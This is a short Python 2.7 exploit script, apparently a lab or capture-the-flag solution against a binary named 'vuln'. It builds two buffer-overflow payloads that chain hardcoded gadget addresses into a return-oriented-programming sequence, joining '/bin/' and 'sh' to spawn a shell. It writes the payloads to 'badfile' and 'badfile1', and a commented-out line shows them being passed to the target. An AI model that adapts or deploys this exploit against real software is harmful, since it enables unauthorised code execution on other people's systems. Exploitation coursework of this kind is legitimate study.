# NOTE: For Python 2.7
# to find out the gadgets address you need to download the ROPgadget from 
# this link: https://github.com/JonathanSalwan/ROPgadget.git


import os
import struct

#Find gadgets
ret = 0x0a
str1 = 0x804a0c8
str2 = 0x804a0c4
string = 0x804a060
pop_pop_ret = 0x0804878a 
lazy = 0x8048567
join_string = 0x80484fb

#Buffer Overflow
payload = "/bin/"
payload += "A"*0x7b
payload += struct.pack("I",str1)
payload += struct.pack("B",ret)

payload1 = "sh" 
payload1 += "A"*0x92
payload1 += struct.pack("I",str2)
payload1 += "A"*8

 
# join_string(string, str1) gadget
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", pop_pop_ret)
payload1 += struct.pack("I", string)
payload1 += struct.pack("I", str1)

# join_string(string, str2) gadget
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", pop_pop_ret)
payload1 += struct.pack("I", string)
payload1 += struct.pack("I", str2)

payload1 += struct.pack("I", lazy)

f = open("badfile", "a")
f.write("%s" % payload) 
f.close()
f = open("badfile1", "a")
f.write("%s" % payload1) 
f.close()
#os.system("./vuln \"%s\"\"%s\"" % payload % payload1 )
